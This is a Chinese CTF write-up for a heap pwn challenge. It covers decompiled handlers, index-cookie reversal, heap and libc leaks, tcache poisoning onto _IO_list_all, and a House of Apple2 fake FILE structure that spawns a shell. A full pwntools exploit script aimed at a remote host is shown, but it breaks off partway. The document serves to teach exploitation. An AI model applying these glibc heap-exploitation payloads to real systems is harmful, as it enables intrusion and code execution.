+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_idx</span><span class="params">(<span class="type">char</span> long2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_132A(Rand ^ long2, <span class="number">5</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">sub_132A</span><span class="params">(<span class="type">unsigned</span> __int8 a1, <span class="type">char</span> n5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (a1 &lt;&lt; (n5 &amp; <span class="number">7</span>)) | (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)a1 &gt;&gt; (<span class="number">8</span> - (n5 &amp; <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到idx的获取,是数据包中的Idx成员与随机数进行xor,然后高低位反转,作为最后真正的idx<br>据此我们可以逆向分析得到如何输入Idx</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">idx</span>(<span class="params">Id</span>):</span><br><span class="line">    t1=Id&amp;<span class="number">31</span></span><br><span class="line">    t2=(Id-t1)&gt;&gt;<span class="number">5</span></span><br><span class="line">    t1=t1&lt;&lt;<span class="number">3</span><span class="comment">#高低位反转</span></span><br><span class="line">    <span class="keyword">return</span> (t2+t1)^cookie<span class="comment">#cookie为随机数</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="堆块管理系统分析"><a href="#堆块管理系统分析" class="headerlink" title="堆块管理系统分析"></a>堆块管理系统分析</h2><p>随后进入到了堆块管理系统<br>根据数据包中opcode成员,进入不同的处理函数</p>
+<h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><p><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028778124.png" alt="1758028778124"><br>可以看到,进行create操作,需要传入的结构体中存在<code>size</code>,<code>content</code>与<code> content_lenth</code>成员存在</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">create</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n0x100000_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n0x100000_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i_1; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !size || size &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bad size&quot;</span>);</span><br><span class="line">  i_1 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !LODWORD(<span class="built_in">list</span>[i].flag) )</span><br><span class="line">    &#123;</span><br><span class="line">      i_1 = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i_1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;full&quot;</span>);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oom&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">list</span>[i_1].ptr = (__int64)dest;</span><br><span class="line">  <span class="built_in">list</span>[i_1].size = size;</span><br><span class="line">  <span class="built_in">list</span>[i_1].Id = <span class="number">0LL</span>;</span><br><span class="line">  LODWORD(<span class="built_in">list</span>[i_1].flag) = <span class="number">1</span>;</span><br><span class="line">  n = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( src &amp;&amp; n0x100000_2 )</span><br><span class="line">  &#123;</span><br><span class="line">    n0x100000_1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( n0x100000_2 &lt;= size )</span><br><span class="line">      n0x100000_1 = n0x100000_2;</span><br><span class="line">    n = n0x100000_1;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, src, n0x100000_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">list</span>[i_1].Id = n;</span><br><span class="line">  *((_BYTE *)dest + n) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;ok idx=%d\n&quot;</span>, i_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单进行判断后,将<code>size</code>,<code>ptr</code>,<code>Id</code>与<code>flag低位</code>存入全局变量<code>list</code>中<br>然后将content使用memcpy复制进去,并对结尾进行置零操作<br>由于对size与content_lenth进行了完备的检查,此处不存在溢出<br>我们需要发送一下数据包进行create操作的请求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">1</span>)</span><br><span class="line">    payload+=m(<span class="number">3</span>&lt;&lt;<span class="number">3</span>)+m(size)</span><br><span class="line">    payload+=m(<span class="number">2</span>+(<span class="number">4</span>&lt;&lt;<span class="number">3</span>))+m(<span class="built_in">len</span>(content))+content</span><br><span class="line">    <span class="built_in">print</span>(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028795461.png" alt="1758028795461"><br>通过log说明,需要<code>Idx</code>,<code>size</code>和<code>content(lenth)</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx, <span class="type">size_t</span> Size, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> ture_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  chunk_list *v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0x10</span> || !LODWORD(<span class="built_in">list</span>[idx].flag) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bad idx&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;need data&quot;</span>);</span><br><span class="line">  v7 = &amp;<span class="built_in">list</span>[idx];</span><br><span class="line">  <span class="keyword">if</span> ( Size &gt; v7-&gt;size )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too long&quot;</span>);</span><br><span class="line">  n_1 = ture_len;</span><br><span class="line">  <span class="keyword">if</span> ( Size &lt;= ture_len )</span><br><span class="line">    n_1 = Size;</span><br><span class="line">  n = n_1;</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)v7-&gt;ptr, src, n_1);</span><br><span class="line">  v7-&gt;Id = n;</span><br><span class="line">  *(_BYTE *)(v7-&gt;ptr + n) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;edited&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过Idx在bss上寻址,找到对应堆块,将内容复制并置零<br>同样对长度有完备的检查,不存在溢出<br>以下结构进行<code>edit</code>请求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Id,content</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">2</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    payload+=m(<span class="number">3</span>&lt;&lt;<span class="number">3</span>)+m(<span class="built_in">len</span>(content))</span><br><span class="line">    payload+=m(<span class="number">2</span>+(<span class="number">4</span>&lt;&lt;<span class="number">3</span>))+m(<span class="built_in">len</span>(content))+content</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="delet-show"><a href="#delet-show" class="headerlink" title="delet&#x2F;show"></a>delet&#x2F;show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">delet</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n0x10)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &gt;= <span class="number">0x10</span> || !LODWORD(<span class="built_in">list</span>[n0x10].flag) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bad idx&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)<span class="built_in">list</span>[n0x10].ptr);</span><br><span class="line">  LODWORD(<span class="built_in">list</span>[n0x10].flag) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;freed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常的delet操作,不存在uaf漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">3</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall show(unsigned int n0x10)</span><br><span class="line">&#123;</span><br><span class="line">  const char *ptr; // rax</span><br><span class="line"></span><br><span class="line">  if ( n0x10 &gt;= 0x10 || !LODWORD(list[n0x10].flag) )</span><br><span class="line">    return puts(&quot;bad idx&quot;);</span><br><span class="line">  if ( HIDWORD(list[n0x10].flag) )</span><br><span class="line">    return puts(&quot;no show&quot;);</span><br><span class="line">  if ( list[n0x10].ptr )</span><br><span class="line">    ptr = (const char *)list[n0x10].ptr;</span><br><span class="line">  else</span><br><span class="line">    ptr = &quot;(null)&quot;;</span><br><span class="line">  return puts(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常show</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">4</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall uaf(unsigned int n0x10)</span><br><span class="line">&#123;</span><br><span class="line">  chunk_list *v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( chance )</span><br><span class="line">    return puts(&quot;uaf once&quot;);</span><br><span class="line">  if ( n0x10 &gt;= 0x10 || !LODWORD(list[n0x10].flag) )</span><br><span class="line">    return puts(&quot;bad idx&quot;);</span><br><span class="line">  v2 = &amp;list[n0x10];</span><br><span class="line">  if ( !v2-&gt;ptr )</span><br><span class="line">    return puts(&quot;no buf&quot;);</span><br><span class="line">  free((void *)v2-&gt;ptr);</span><br><span class="line">  HIDWORD(v2-&gt;flag) = 1;</span><br><span class="line">  chance = 1;</span><br><span class="line">  puts(&quot;uaf armed&quot;);</span><br><span class="line">  return overflow();</span><br><span class="line">&#125;</span><br><span class="line">int overflow()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  _BYTE buf[77]; // [rsp+Fh] [rbp-51h] BYREF</span><br><span class="line">  int v3; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  puts(&quot;your msg:&quot;);</span><br><span class="line">  while ( read(0, buf, 1uLL) == 1 &amp;&amp; buf[0] != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = v3++;</span><br><span class="line">    buf[v0 + 1] = buf[0];</span><br><span class="line">  &#125;</span><br><span class="line">  buf[v3 + 1] = 0;</span><br><span class="line">  return puts(&quot;done&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出题人给了一次uaf机会,且在uaf后调用了一次可以无限栈溢出的函数<code>overflow</code><br>以下结构请求uaf操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">Id</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">9</span>)</span><br><span class="line">    payload+=m(<span class="number">2</span>&lt;&lt;<span class="number">3</span>)+m(idx(Id))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>由于create和edit操作中都有置零操作,所以不存在泄露libc&#x2F;heap信息的机会<br>想要泄露信息只能通过uaf后的show,那么我们就无法利用uaf中的overflow函数<br>之后无论是劫持IO结构体还是劫持栈上的返回值都是可以getshell&#x2F;orw的</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf00</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">uaf(<span class="number">1</span>)</span><br><span class="line">io.sendline()<span class="comment">#跳过stackoverflow</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;freed\n&quot;</span>)</span><br><span class="line">heap=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0xb90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;freed\n&quot;</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
+
+<p>通过简单堆风水进行heap与libc的泄露</p>
+<h2 id="tcachebins-poison攻击"><a href="#tcachebins-poison攻击" class="headerlink" title="tcachebins_poison攻击"></a>tcachebins_poison攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#=======================================3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">key=heap&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">_IO_list_all=libc.sym._IO_list_all+base</span><br><span class="line">system=libc.sym.system+base</span><br><span class="line">edit(<span class="number">3</span>,p64(key^_IO_list_all))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(heap+<span class="number">0x340</span>))</span><br></pre></td></tr></table></figure>
+
+<p>污染next指针为_IO_list_all,将其劫持到堆上的可控地址中</p>
+<h2 id="伪造IO结构体-并触发其中的函数表"><a href="#伪造IO结构体-并触发其中的函数表" class="headerlink" title="伪造IO结构体,并触发其中的函数表"></a>伪造IO结构体,并触发其中的函数表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data=heap+<span class="number">0x340</span></span><br><span class="line">_IO_wfile_jumps=base+libc.sym._IO_wfile_jumps</span><br><span class="line">fake=flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>:<span class="string">&quot;  sh&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>:p64(<span class="number">1</span>),</span><br><span class="line">    <span class="number">0x68</span>:p64(system),</span><br><span class="line">    <span class="number">0x88</span>:p64(heap+<span class="number">0x900</span>),</span><br><span class="line">    <span class="number">0xa0</span>:p64(data),</span><br><span class="line">    <span class="number">0xd8</span>:p64(_IO_wfile_jumps),</span><br><span class="line">    <span class="number">0xe0</span>:p64(data)</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">5</span>,fake)</span><br><span class="line">ex()</span><br><span class="line">io.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>经典的house of apple2,调用system(“  sh”)getshell</p>
+<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整<code>EXP</code></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;172.36.120.113&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">lib.srand(lib.time(<span class="number">0</span>))</span><br><span class="line">cookie=lib.rand()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m</span>(<span class="params">n</span>):</span><br><span class="line">    num=<span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        t=n&amp;<span class="number">0x7f</span></span><br><span class="line">        n=n&gt;&gt;<span class="number">7</span></span><br><span class="line">        t+=<span class="number">0x80</span></span><br><span class="line">        num+=p8(t)</span><br><span class="line">    s=u8(num[-<span class="number">1</span>:])</span><br><span class="line">    num=num[:-<span class="number">1</span>]</span><br><span class="line">    num+=p8(s-<span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">idx</span>(<span class="params">Id</span>):</span><br><span class="line">    t1=Id&amp;<span class="number">31</span></span><br><span class="line">    t2=(Id-t1)&gt;&gt;<span class="number">5</span></span><br><span class="line">    t1=t1&lt;&lt;<span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> (t2+t1)^cookie</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    payload =m(<span class="number">1</span>&lt;&lt;<span class="number">3</span>)+m(<span class="number">1</span>)</span><br><span class="line">    payload+=m(<span class="number">3</span>&lt;&lt;<span class="number">3</span>)+m(size)</span><br><span class="line">    payload+=m(<span class="number">2</span>+(<span class="number">4</span>&lt;&lt;<span class="number">3</span>))+m(<span class="built_in">len</span>(content))+content</span><br><span class="line">    <span class="built_in">print</span>(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(m(<span class="built_in">len</span>(payload)))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Id,content</span>):</span><br><span class="line">    payload =m(<span 